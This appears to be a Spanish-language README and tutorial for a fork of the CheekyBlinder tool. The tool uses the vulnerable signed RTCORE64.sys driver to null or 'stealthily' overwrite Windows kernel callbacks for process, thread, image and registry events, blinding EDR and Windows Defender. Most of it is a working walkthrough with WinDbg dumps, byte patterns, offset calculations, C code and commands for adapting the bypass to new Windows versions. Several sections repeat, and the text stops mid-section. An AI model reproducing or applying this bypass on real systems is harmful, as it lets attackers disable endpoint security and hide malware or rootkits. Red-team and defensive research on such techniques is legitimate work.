# Kernel Notify Callbacks Removal


CheekyBlinder es un proyecto desarrollado hace 5 años para eliminar las llamadas de retorno del kernel relacionadas con la creación de procesos, carga de imágenes, creación de hilos y modificaciones del registro por https://github.com/br-sn.

## Advertencia

Aunque puedes descargar los binarios de los `releases`, tienes que asegurarte de que los offsets y los opcodes de busqueda de binarios realizados son los mismos en tu version de windows o obtendras una **PANTALLA AZUL DE MUERTE**.

## Principales actualizaciones

- Actualizado el exploit para que funcione en las últimas versiones de Windows.

- Introducido un método más sigiloso para eludir las retrollamadas del kernel (aún no revelado públicamente, al menos que yo sepa).

- Completada la eliminación del callback del registro, que antes no estaba completada.

- Añadida guía paso a paso para modificar el exploit para futuras o diferentes versiones de Windows.

- Modificado el código para hacerlo reutilizable para otras modificaciones del kernel.

CheekyBlinder es un proyecto desarrollado hace 5 años para eliminar callbacks del kernel relacionados con la creación de procesos, carga de imágenes, creación de hilos y modificaciones del registro por https://github.com/br-sn.

## Advertencia

Aunque puedes descargar los binarios de los `releases`, tienes que asegurarte de que los offsets y los opcodes de busqueda de binarios realizados son los mismos en tu version de windows o obtendras una **PANTALLA AZUL DE MUERTE**.



## Prerequisistes

Este código está basado en la entrada original del blog: [Removing Kernel Callbacks Using Signed Drivers](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) por lo que recomiendo repasar los conceptos allí primero.

Este es un tema avanzado que requiere los siguientes prerrequisitos:

- Conocimiento de ensamblador

- Familiaridad con la programación en C

- Experiencia con WinDbg

- Familiaridad con IDA

- Conocimientos de explotación del kernel de Windows

## Herramientas utilizadas

WinDbg: [Herramientas de depuración de Windows](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)

## Configuración de depuración del kernel

Para depurar tu kernel local, sigue las instrucciones aquí: [Configuración de la depuración del kernel local](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)

## Público objetivo

Este proyecto es para que tanto pentesters como defensores entiendan cómo los atacantes pueden eludir las implementaciones del kernel EDR.

## Propósito

Ya existen herramientas, por ejemplo [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast), que es genial y que hará esto y más y calculará los offsets automáticamente, pero esto está diseñado para ser pequeño y puntual por múltiples razones:

- Para que todo el mundo sea capaz de aprender cómo se hace técnicamente eludir EDR y la eliminación de callback del kernel.
- Para tener la flexibilidad de crear tu propia herramienta que haga más fácil eludir la detección basada en firmas.
- Para que los investigadores puedan jugar con el código, depurarlo y revertirlo.
- Introducir una forma más sigilosa que no está incluida en EDRSandblast.


## Nuevo método introducido

El método público para evitar la mayoría de las retrollamadas del kernel implica anular toda la entrada del controlador en la tabla de retrollamadas. El nuevo método discutido aquí es más sigiloso y modifica la función callback en sí misma mientras mantiene el cumplimiento de Kernel Control Flow Guard (KCFG).

podemos sobreescribir la propia función por una función conforme a KCFG porque basándonos en la documentación de [microsoft](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pcreate_process_notify_routine) para configurar una rutina notify, la rutina no devuelve nada (es void), por lo que es fácil encontrar una función conforme a KCFG que no haga mucho e incluso si devuelve, el valor de retorno no se utiliza.
## Público Objetivo

Este proyecto es para que tanto pentesters como defensores entiendan como los atacantes pueden saltarse las implementaciones del kernel EDR.

## Propósito

Ya existen herramientas, por ejemplo [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) que es genial y que hará esto y más y calculará los offsets automáticamente, pero esto está diseñado para ser pequeño y puntual por múltiples razones:

- Para que todo el mundo sea capaz de aprender cómo se hace técnicamente eludir EDR y la eliminación de callback del kernel.
- Para tener la flexibilidad de crear tu propia herramienta que haga más fácil eludir la detección basada en firmas.
- Para que los investigadores puedan jugar con el código, depurarlo y revertirlo.
- Introducir una forma más sigilosa que no está incluida en EDRSandblast.


## Casos de abuso del atacante

Un atacante con privilegios administrativos puede intentar desactivar EDR o instalar un rootkit. Para interactuar con el kernel, se necesita un controlador firmado de Microsoft. Dado que los controladores no firmados no pueden cargarse con las mitigaciones de Microsoft activadas (por ejemplo, VBS, Hyper-V), los atacantes suelen explotar los controladores firmados vulnerables que no han sido incluidos en la lista negra.

**El proyecto NotifyRoutineKernelBypass utiliza el controlador RTCORE64.sys, que aún no ha sido incluido en la lista negra de MICROSOFT**.

## Introducción a las retrollamadas del kernel

Los proveedores de antivirus y los sistemas anti-trampas del kernel registran callbacks del kernel para monitorizar eventos del sistema. Estas retrollamadas notifican al software de seguridad de eventos en modo usuario, como la creación de procesos.

Así, el controlador del kernel registrará una llamada de retorno (para la creación de procesos en nuestro ejemplo) dentro del kernel que notificará al controlador AV / EDR cuando se cree / genere un nuevo proceso en modo usuario.

El kernel utiliza un array / tabla de callback para guardar todas las entradas de callback que son registradas por el AV / EDR y que serán notificadas cuando se cree un proceso por ejemplo.

**Y el array de callbacks ya es escribible en el kernel, lo que facilita también a los atacantes corromperlo.**

## Llamadas de retorno del núcleo para la creación de procesos

Para las callbacks de creación de procesos el array es `nt!PspCreateProcessNotifyRoutine` que puede encontrarse dentro de la función `nt!PspSetCreateProcessNotifyRoutine`.

<pre>
nt!PspSetCreateProcessNotifyRoutine+0x54:
fffff807`23c1b2dc 488bf8          mov     rdi,rax
fffff807`23c1b2df 4885c0          test    rax,rax
fffff807`23c1b2e2 0f84ae630f00    je      nt!PspSetCreateProcessNotifyRoutine+0xf640e (fffff807`23d11696)
fffff807`23c1b2e8 33db            xor     ebx,ebx
<mark>fffff807`23c1b2ea 4c8d2d0f124f00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff807`2410c500)]</mark>
fffff807`23c1b2f1 488d0cdd00000000 lea     rcx,[rbx*8]
fffff807`23c1b2f9 4533c0          xor     r8d,r8d
fffff807`23c1b2fc 4903cd          add     rcx,r13
</pre>

Y ahora podemos acceder a las entradas de la matriz de devolución de llamada de la siguiente manera:

<pre>
lkd> dq nt!PspCreateProcessNotifyRoutine
fffff807`2410c500  ffff800e`5beb7b4f ffff800e`5c7f725f
fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
fffff807`2410c540  ffff800e`5e1ab33f ffff800e`5e1adf4f
fffff807`2410c550  00000000`00000000 00000000`00000000
fffff807`2410c560  00000000`00000000 00000000`00000000
fffff807`2410c570  00000000`00000000 00000000`00000000
</pre>

Cada una de estas entradas es un callback registrado por un driver EDR sys, tomemos la segunda entrada como ejemplo <mark>ffff800e`5c7f725f</mark>

Primero tenemos que eliminar el último byte y anularlo (Los últimos 4 bits de estas direcciones de puntero son insignificantes), para acceder a la estructura de entrada de callback.

<pre>
lkd> ? (ffff800e`5c7f725f >> 4) << 4
Evaluate expression: -140675806956976 = ffff800e`5c7f725<mark>0</mark>
lkd> dq ffff800e`5c7f7250 L4
ffff800e`5c7f7250  00000000`00000020 <mark>fffff807`252e9b70</mark>
ffff800e`5c7f7260  00000000`00000006 00000000`00000000
lkd> u fffff807`252e9b70 L3
<mark>WdFilter!MpCreateProcessNotifyRoutineEx:</mark>
fffff807`252e9b70 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff807`252e9b75 48894c2408      mov     qword ptr [rsp+8],rcx
fffff807`252e9b7a 55              push    rbp
</pre>

La segunda entrada que es <mark>fffff807`252e9b70</mark> es una de las funciones que seran llamadas cuando se cree un proceso (WdFilter driver esta relacionado con windows defender). y esta es solo una de las entradas callback.

Así que en el proyecto original de cheeckyblinder lo que hizo fue anular toda la entrada en la tabla de callback que es esta <mark>ffff800e`5c7f725f</mark>, así que usando un exploit de kernel primitivo R/W podemos anular la entrada, y así es como queda la tabla de callback después de anularla.

<pre>
lkd> dq nt!PspCreateProcessNotifyRoutine
fffff807`2410c500  ffff800e`5beb7b4f <mark>00000000`00000000</mark>
fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
fffff807`2410c540  ffff800e`5e1ab33f ffff800e`5e1adf4f
fffff807`2410c550  00000000`00000000 00000000`00000000
fffff807`2410c560  00000000`00000000 00000000`00000000
fffff807`2410c570  00000000`00000000 00000000`00000000
</pre>

pero lo que hice fue, en lugar de anular toda la entrada, cambié la función en la matriz de devolución de llamada a otra que sólo devuelve, pero tiene que ser compatible con KCFG.

La función `nt!KeGetCurrentIrql` es una función válida para KCFG que técnicamente sólo devuelve.

<pre>
lkd> dq nt!PspCreateProcessNotifyRoutine
fffff807`2410c500  ffff800e`5beb7b4f <mark>ffff9b02`251f6dff</mark>
fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
fffff807`2410c540  ffff800e`5e1ab33f ffff800e`5e1adf4f
fffff807`2410c550  00000000`00000000 00000000`00000000
fffff807`2410c560  00000000`00000000 00000000`00000000
fffff807`2410c570  00000000`00000000 00000000`00000000
lkd> dq ffff9b02`251f6df0 L2
ffff9b02`251f6df0  00000000`00000020 <mark>fffff804`8fdea060</mark>
lkd> u fffff804`8fdea060 L2
<mark>nt!KeGetCurrentIrql:</mark>
fffff804`8fdea060 440f20c0        mov     rax,cr8
fffff804`8fdea064 c3              ret
</pre>

Como puedes ver, en lugar de anular toda la entrada de callback => simplemente cambiamos la función dentro de la entrada a KeGetCurrentIrql, que no hará nada, evitando lo que el AV / EDR estaba comprobando.

**Y si el EDR estaba monitorizando la propia entrada callback si es nula o no, esto saltará esa técnica de monitorización.

## What is KCFG
KCFG (Control Flow Guard) es una característica de seguridad relacionada con Control Flow Guard (CFG), que está diseñada para proteger el software de ciertos tipos de ataques, en particular ataques de secuestro de flujo de control (por ejemplo, desbordamientos de búfer, programación orientada al retorno o ataques ROP). Fue introducido por primera vez por Microsoft para evitar estos ataques garantizando que la ejecución del código sólo se produzca en ubicaciones válidas.

Así, todas las llamadas indirectas (call rax por ejemplo) serán reemplazadas y verificadas por KCFG como se indica a continuación.

<pre>
lkd> u FLTMGR!FltDoCompletionProcessingWhenSafe+0x77
FLTMGR!FltDoCompletionProcessingWhenSafe+0x77:
fffff807`1ee01567 488bcd          mov     rcx,rbp
fffff807`1ee0156a bf01000000      mov     edi,1
<mark>fffff807`1ee0156f ff1583450300    call    qword ptr [FLTMGR!_guard_dispatch_icall_fptr (fffff807`1ee35af8)]</mark>
fffff807`1ee01575 8bd8            mov     ebx,eax
fffff807`1ee01577 41891e          mov     dword ptr [r14],ebx
fffff807`1ee0157a 408ac7          mov     al,dil
fffff807`1ee0157d 488b5c2450      mov     rbx,qword ptr [rsp+50h]
fffff807`1ee01582 488b6c2458      mov     rbp,qword ptr [rsp+58h]
lkd> dqs FLTMGR!_guard_dispatch_icall_fptr L1
fffff807`1ee35af8  fffff807`23820170 <mark>nt!guard_dispatch_icall</mark>
lkd> u fffff807`23820170
nt!guard_dispatch_icall:
<mark>fffff807`23820170 4c8b1d89179e00  mov     r11,qword ptr [nt!guard_icall_bitmap (fffff807`24201900)]</mark>
fffff807`23820177 4885c0          test    rax,rax
</pre>

La función real a la que queremos llamar se cargará en rax y se llamará a KCFG (nt!guard_dispatch_icall), que verificará que la función dentro de rax es una función válida mediante un mapa de bits usando el siguiente proceso (el proceso está dentro de nt!guard_dispatch_icall).

Los cálculos se basan en la función `nt!KeGetCurrentIrql`, porque esta es la función que vamos a acabar llamando.

<pre>
lkd> ? nt!KeGetCurrentIrql >> 9 (Will be used as Index)
Evaluate expression: 36028779900694815 = 007ffffc`03abf11f

lkd> ? (nt!KeGetCurrentIrql >> 3) mod 40 (BitToCheck)
Evaluate expression: 54 = 00000000`00000036

lkd> dqs nt!guard_icall_bitmap L1
fffff807`58a01900  fbffa8d7`9452c248

lkd> dqs fbffa8d7`9452c248 + 007ffffc`03abf11f (Index) * 0x08 L1 (Entry)
ffffa8b7`b1b24b40  00410004`00004400

lkd> .formats 00410004`00004400
Evaluate expression:
Binary:  00000000 0<mark>1</mark>000001 00000000 00000100 00000000 00000000 01000100 00000000
</pre>

El `BitToCheck` que en nuestro caso es el bit 54 tiene que ser `1`, si es `1` significa que la llamada es válida que es el caso de `KeGetCurrentIrql`.

Así que el plan es reemplazar la función que apunta a la función AV a llamar (`fffff807252e9b70`) por KeGetCurrentIrql (`fffff80723623fb0`) lo que hará la entrada inútil.

<pre>
lkd> u KeGetCurrentIrql L2
<mark>nt!KeGetCurrentIrql:</mark>
<mark>fffff807`23623fb0</mark> 440f20c0        mov     rax,cr8
fffff807`23623fb4 c3              ret
lkd> dq ffff800e`5c7f7250 L4
ffff800e`5c7f7250  00000000`00000020 <mark><del>fffff807`252e9b70</del></mark>
ffff800e`5c7f7260  00000000`00000006 00000000`00000000
lkd> eq ffff800e`5c7f7258 fffff807`23623fb0
lkd> dq ffff800e`5c7f7250 L4
ffff800e`5c7f7250  00000000`00000020 <mark>fffff807`23623fb0</mark>
ffff800e`5c7f7260  00000000`00000006 00000000`00000000
lkd> u fffff807`252e9b70 L2
<mark>WdFilter!MpCreateProcessNotifyRoutineEx:</mark>
<mark>fffff805`55e99b70</mark> 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff805`55e99b75 48894c2408      mov     qword ptr [rsp+8],rcx
</pre>

## Cómo Arreglar el código para que funcione en tu versión de windows (callback de creación de proceso primero)

### Arreglar los bytes para la búsqueda de bytes para tu SO windows

El cambio debe hacerse tanto en `findprocesscallbackroutine` como en `findprocesscallbackroutinestealth`.

`findprocesscallbackroutinestealth` es la función que he introducido que modificará la función dentro de la entrada.

`findprocesscallbackroutine` es la función original del exploit original que anulará la entrada.

El código original hará una `byte search` para encontrar la ubicación de la función que está utilizando la tabla de callback (`nt!PspSetCreateProcessNotifyRoutine`) a partir de una función exportada cerca de ella.

Primero debe comprobar que los bytes no han cambiado en su sistema operativo.

<pre>
struct Offsets {
    <mark>DWORD64 process;</mark>
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
        //case 1903:
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2009:
        return { <mark>0x7340fe8341f63345</mark>, 0x8d48d68b48c03345, 0x48d90c8d48c03345, 0x4024448948f88b48 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");

    }

}
</pre>

El primer DWORD es el callback relacionado con la creación del proceso y contiene los bytes que el programa buscará.

 sabemos que la función `nt!PspSetCreateProcessNotifyRoutine` está usando el array callback.

La idea es encontrar algunos bytes cerca del comando `lea` que está usando el array callback que nos interesa, y los bytes que usaremos, necesitan ser estáticos para que podamos confiar en ellos para la búsqueda de bytes y no cambien después de cada reinicio.
<pre>
lkd> u nt!PspSetCreateProcessNotifyRoutine L20
nt!PspSetCreateProcessNotifyRoutine:
fffff800`a4e61fd0 48895c2408      mov     qword ptr [rsp+8],rbx
fffff800`a4e61fd5 48896c2410      mov     qword ptr [rsp+10h],rbp
fffff800`a4e61fda 4889742418      mov     qword ptr [rsp+18h],rsi
fffff800`a4e61fdf 57              push    rdi
fffff800`a4e61fe0 4154            push    r12
fffff800`a4e61fe2 4155            push    r13
fffff800`a4e61fe4 4156            push    r14
fffff800`a4e61fe6 4157            push    r15
fffff800`a4e61fe8 4883ec20        sub     rsp,20h
fffff800`a4e61fec 8bf2            mov     esi,edx
fffff800`a4e61fee 8bda            mov     ebx,edx
fffff800`a4e61ff0 83e602          and     esi,2
fffff800`a4e61ff3 4c8bf9          mov     r15,rcx
fffff800`a4e61ff6 f6c201          test    dl,1
fffff800`a4e61ff9 0f8487000000    je      nt!PspSetCreateProcessNotifyRoutine+0xb6 (fffff800`a4e62086)
fffff800`a4e61fff 65488b2c2588010000 mov   rbp,qword ptr gs:[188h]
<mark>fffff800`a4e62008 4c8d2d712a4a00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff800`a5304a80)]</mark>
fffff800`a4e6200f 83c8ff          or      eax,0FFFFFFFFh
fffff800`a4e62012 660185e4010000  add     word ptr [rbp+1E4h],ax
fffff800`a4e62019 90              nop
<mark>fffff800`a4e6201a 4533f6          xor     r14d,r14d
fffff800`a4e6201d 4183fe40        cmp     r14d,40h
fffff800`a4e62021 7338            jae     nt!PspSetCreateProcessNotifyRoutine+0x8b (fffff800`a4e6205b)</mark>
fffff800`a4e62023 4e8d24f500000000 lea     r12,[r14*8]
</pre>

Y así los bytes que podemos usar por ejemplo son los resaltados empezando por xor, pero necesitamos escribirlos en la variable c en inverso (little endian arch) que es `0x7340fe8341f63345`.

<pre>
lkd> dq ffffff800`a4e6201a L1
fffff800`a4e6201a  7340fe83`41f63345
</pre>

### Fijar el offset
A continuación necesitamos fijar el offset, para poder extraer y calcular la dirección del array de callback.

<pre>
void notifyRoutine::findprocesscallbackroutine(DWORD64 remove) {

	//buscamos en la memoria entre PoRegisterCoalescingCallback y EtwWriteEndScenario un conjunto específico de instrucciones junto a una LEA relativa que contiene el offset al array de callbacks PspCreateProcessNotifyRoutine.
	Offsets offsets = getVersionOffsets();
	const DWORD64 IoDeleteSymbolicLink = GetFunctionAddress("IoDeleteSymbolicLink");
	const DWORD64 RtlDestroyHeap = GetFunctionAddress("RtlDestroyHeap");

	//la dirección devuelta por la búsqueda de patrones está justo debajo de los desplazamientos.
	DWORD64 patternaddress = PatternSearch(IoDeleteSymbolicLink, RtlDestroyHeap, offsets.process);
	Log("[+] patternaddress: %p", patternaddress);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - <mark>0x0f</mark>,
		&offset,
		sizeof(offset)
	);

	//así que tomamos la dirección de 64 bits, pero tenemos una suma de 32 bits. Para evitar el desbordamiento, tomamos la primera mitad (desplazamiento a la derecha, desplazamiento a la izquierda), luego sumamos la dirección patrón DWORD de 32 bits con el desplazamiento de 32 bits, y restamos 8. *cringe*
	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - <mark>0x0f</mark> + 0x04;
  ....................
}
</pre>

Mirando este trozo de código, veremos que después de la búsqueda de bytes obtendremos la patternaddress que apuntará al comando xor `fffff800a4e6201a`.
Necesitamos restarle un offset para que apunte al offset relativo de 4 bytes del array que es `712a4a00` al revés en `fffff800a4e6200b`.

<pre>
lkd> dd fffff800`a4e6200b L1
fffff800`a4e6200b  004a2a71
</pre>


así que tenemos que restar `0xf` de la dirección del patrón.

<pre>
lkd> dd fffff800`a4e6200b L1
fffff800`a4e6200b  004a2a71
lkd> ? fffff800`a4e6201a - fffff800`a4e6200b
Evaluate expression: 15 = 00000000`0000000f
</pre>

### Arreglando las funciones
`nt!PspSetCreateProcessNotifyRoutine` no es una función exportada, por lo que no podemos obtener la dirección de la función directamente en nuestro código c.
Necesitamos iniciar la búsqueda de bytes usando una función que sea exportada y cercana a `nt!PspSetCreateProcessNotifyRoutine`.

las funciones necesitan ser exportadas para poder usar GetProcAddress y GetModuleHandle en ellas y obtener la dirección de la función.

Así que para encontrar las funciones exportadas más cercanas (inicio y fin) para usar en nuestro código como punto de partida para la búsqueda de bytes, podemos usar IDA.

Primero obtengamos el offset a la función desde la base nt

así que necesitamos restar `0xf` de la dirección del patrón.

<pre>
lkd> ? nt!PspSetCreateProcessNotifyRoutine - nt
Evaluate expression: 8499848 = <mark>00000000`00a61fd0</mark>
</pre>

Luego copiamos el `ntoskrnl.exe` desde `c:/windows/system32` para abrirlo en IDA.

Luego en IDA, en primer lugar cambiamos la IMAGEBASE a 0x00, para hacer que los desplazamientos que obtenemos en `windbg` de la base nt sean la dirección real en IDA, sin ningún cálculo adicional.

![IDA Rebase](./screenshots/RebaseProgram.png)

![IDA Rebase](./screenshots/Rebasev2.png)

A continuación vamos a la `Tabla de exportación` en IDA y reordenamos todas las funciones por `dirección`.

Nota: Tomará algún tiempo para que las direcciones en la tabla de exportación se actualicen después del rebase.

Y entonces tienes que elegir 2 funciones donde `0000000000a61fd0` que es la dirección de `nt!PspSetCreateProcessNotifyRoutine` esté entre ellas.

Como se puede ver en la captura de pantalla `IoDeleteSymbolicLink` y `RtlDestroyHeap` son las funciones de inicio y fin que voy a utilizar ya que `nt!PspSetCreateProcessNotifyRoutine` se encuentra en medio, por lo que puedo utilizar `IoDeleteSymbolicLink` como inicio de la búsqueda de bytes.

![Export Table](./screenshots/ExportTable.png)

### Resto del código

y el resto del código es un bucle a través del array de callbacks que acabamos de encontrar, y anular la entrada o reemplazar la función en la entrada dependiendo de la función que estés usando.

```
/delproc <dirección> - Eliminar Callback de Creación de Proceso
/delprocstealth <dirección> - sobrescribir el Callback de la función de Creación de Proceso
```

Puedes consultar el [Cheeckyblinder Blog](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/) para más información sobre el código.

## Thread Callback
Cuando se crea un nuevo hilo, cada entrada en el array de callbacks que fue registrada por el EDR será llamada.

Los mismos pasos que hicimos para la llamada de retorno del proceso, sólo que es una función de llamada de retorno y un array de llamadas de retorno diferentes para las acciones relacionadas con el hilo.

La función se llama `nt!PspSetCreateThreadNotifyRoutine` que utiliza el array de callbacks `nt!PspCreateThreadNotifyRoutine`.

<pre>
lkd> u nt!PspSetCreateThreadNotifyRoutine L12
nt!PspSetCreateThreadNotifyRoutine:
fffff800`a4b54b18 48895c2408      mov     qword ptr [rsp+8],rbx
fffff800`a4b54b1d 4889742410      mov     qword ptr [rsp+10h],rsi
fffff800`a4b54b22 57              push    rdi
fffff800`a4b54b23 4883ec20        sub     rsp,20h
fffff800`a4b54b27 8bf2            mov     esi,edx
fffff800`a4b54b29 8bd2            mov     edx,edx
fffff800`a4b54b2b e8807f3000      call    nt!ExAllocateCallBack (fffff800`a4e5cab0)
fffff800`a4b54b30 488bf8          mov     rdi,rax
fffff800`a4b54b33 4885c0          test    rax,rax
fffff800`a4b54b36 746f            je      nt!PspSetCreateThreadNotifyRoutine+0x8f (fffff800`a4b54ba7)
fffff800`a4b54b38 33db            xor     ebx,ebx
fffff800`a4b54b3a 83fb40          cmp     ebx,40h
fffff800`a4b54b3d 735e            jae     nt!PspSetCreateThreadNotifyRoutine+0x85 (fffff800`a4b54b9d)
<mark>fffff800`a4b54b3f 488d0d3afd7a00  lea     rcx,[nt!PspCreateThreadNotifyRoutine (fffff800`a5304880)]</mark>
<mark>fffff800`a4b54b46 4533c0          xor     r8d,r8d
fffff800`a4b54b49 488d0cd9        lea     rcx,[rcx+rbx*8]
fffff800`a4b54b4d 488bd7          mov     rdx,rdi</mark>
fffff800`a4b54b50 e8774ac6ff      call    nt!ExCompareExchangeCallBack (fffff800`a47b95cc)
</pre>

Los bytes serán `0x48d90c8d48c03345` y tenemos que restar `0x04` para llegar a la dirección offset relativa de la matriz de callback que es `007afd3a` y leerla.

<pre>
lkd> dq fffff800`a4b54b46 L1
fffff800`a4b54b46  48d90c8d`48c03345
</pre>

<pre>
struct Offsets {
    DWORD64 process;
    DWORD64 image;
    <mark>DWORD64 thread;</mark>
    DWORD64 registry;
};

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
        //case 1903:
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2009:
        return { 0x7340fe8341f63345, 0x8d48d68b48c03345, <mark>0x48d90c8d48c03345</mark>, 0x4024448948f88b48 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");

    }

}
</pre>

Usando el mismo método que el callback del proceso necesitamos encontrar 2 funciones cercanas a `PspSetCreateThreadNotifyRoutine` para la búsqueda de bytes.

<pre>
lkd> ? nt!PspSetCreateThreadNotifyRoutine - nt
Evaluar expresión: 7686936 = 00000000`00754b18
</pre>

![Export Table](./screenshots/ExportTableThread.png)

## Llamada de retorno de imagen

La función es `nt!PsSetLoadImageNotifyRoutineEx`.

<pre>
lkd> u nt!PsSetLoadImageNotifyRoutineEx L15
nt!PsSetLoadImageNotifyRoutineEx:
fffff800`a4e5c970 48895c2408      mov     qword ptr [rsp+8],rbx
fffff800`a4e5c975 48896c2410      mov     qword ptr [rsp+10h],rbp
fffff800`a4e5c97a 4889742418      mov     qword ptr [rsp+18h],rsi
fffff800`a4e5c97f 57              push    rdi
fffff800`a4e5c980 4883ec20        sub     rsp,20h
fffff800`a4e5c984 488be9          mov     rbp,rcx
fffff800`a4e5c987 48f7c2feffffff  test    rdx,0FFFFFFFFFFFFFFFEh
fffff800`a4e5c98e 7569            jne     nt!PsSetLoadImageNotifyRoutineEx+0x89 (fffff800`a4e5c9f9)
fffff800`a4e5c990 e81b010000      call    nt!ExAllocateCallBack (fffff800`a4e5cab0)
fffff800`a4e5c995 33db            xor     ebx,ebx
fffff800`a4e5c997 488bf0          mov     rsi,rax
fffff800`a4e5c99a 4885c0          test    rax,rax
fffff800`a4e5c99d 7476            je      nt!PsSetLoadImageNotifyRoutineEx+0xa5 (fffff800`a4e5ca15)
fffff800`a4e5c99f 8bfb            mov     edi,ebx
fffff800`a4e5c9a1 83ff40          cmp     edi,40h
fffff800`a4e5c9a4 7365            jae     nt!PsSetLoadImageNotifyRoutineEx+0x9b (fffff800`a4e5ca0b)
fffff800`a4e5c9a6 8bc7            mov     eax,edi
<mark>fffff800`a4e5c9a8 488d0dd17c4a00  lea     rcx,[nt!PspLoadImageNotifyRoutine (fffff800`a5304680)]
fffff800`a4e5c9af 4533c0          xor     r8d,r8d
fffff800`a4e5c9b2 488bd6          mov     rdx,rsi
fffff800`a4e5c9b5 488d0cc1        lea     rcx,[rcx+rax*8]</mark>
</pre>

igual que los otros, necesitamos asegurarnos de que los bytes son correctos `0x8d48d68b48c03345` y el offset sigue siendo el mismo `0x04` y encontrar 2 funciones cercanas a `nt!PsSetLoadImageNotifyRoutineEx` para la búsqueda de bytes.

<pre>
lkd> dq fffff800`a4e5c9af L1
fffff800`a4e5c9af 8d48d68b`48c03345
</pre>

<pre>
lkd> ? nt!PsSetLoadImageNotifyRoutineEx - nt
Evaluate expression: 10865008 = 00000000`00a5c970
</pre>

![Export Table 2](./screenshots/ExportTableImage.png)

Basado en la captura de pantalla la función `PsSetLoadImageNotifyRoutineEx` es exportada y podemos usarla directamente, no siempre fue el caso entre versiones de windows. así que seguiré usando `RtlAppendStringToString` como inicio y `IoInitializeMiniCompletionPacket` como fin.

## Llamada de retorno al registro

Para el callback del registro es un poco diferente donde todas las funciones callback se guardan dentro de una lista enlazada llamada `nt!CallbackListHead`.

Primero necesitamos encontrar una función que use `nt!CallbackListHead` e idealmente una función exportada para usarla en nuestra búsqueda de bytes.

Primero vamos a calcular el offset de `nt!CallbackListHead` desde la base nt
igual que los otros, necesitamos asegurarnos de que los bytes son correctos `0x8d48d68b48c03345` y el offset sigue siendo el mismo `0x04` y encontrar 2 funciones cercanas a `nt!PsSetLoadImageNotifyRoutineEx` para la búsqueda de bytes.

<pre>
lkd> ? nt!CallbackListHead - nt
Evaluate expression: 15691152 = 00000000`00ef6d90
</pre>

Luego en IDA, vamos a esa dirección yendo a `Jump => Jump to Address` y usamos `00ef6d90

![Saltar a dirección](./screenshots/JumpToAddress.png)

Ahora podemos situar nuestro ratón sobre `CallbackListHead` => pulsar sobre él => y luego pulsar x para obtener una referencia cruzada que nos dirá quién está usando realmente esa lista.

![Referencia cruzada](./screenshots/crossReference.png)

Y por suerte la primera función `CmUnRegisterCallback` también es una función exportada, así que podemos usar las siguientes funciones como inicio y fin de nuestra búsqueda.

![Exportar Tabla 3](./screenshots/ExportTableRegistry.png)

<pre>
nt!CmUnRegisterCallback+0x58:
<mark>fffff800`a4baeaa8 488d0de1827400  lea     rcx,[nt!CallbackListHead (fffff800`a52f6d90)]</mark>
fffff800`a4baeaaf e85cd03c00      call    nt!CmListGetNextElement (fffff800`a4f7bb10)
<mark>fffff800`a4baeab4 488bf8          mov     rdi,rax
fffff800`a4baeab7 4889442440      mov     qword ptr [rsp+40h],rax
fffff800`a4baeabc 4885c0          test    rax,rax</mark>
fffff800`a4baeabf 0f848d000000    je      nt!CmUnRegisterCallback+0x102 (fffff800`a4baeb52)
fffff800`a4baeac5 48395818        cmp     qword ptr [rax+18h],rbx
fffff800`a4baeac9 75d5            jne     nt!CmUnRegisterCallback+0x50 (fffff800`a4baeaa0)
</pre>

Los bytes serán `0x4024448948f88b48` y tenemos que restar `0x09` para llegar a la dirección offset relativa de la matriz de callback que es `007482e1` y leerla.

<pre>
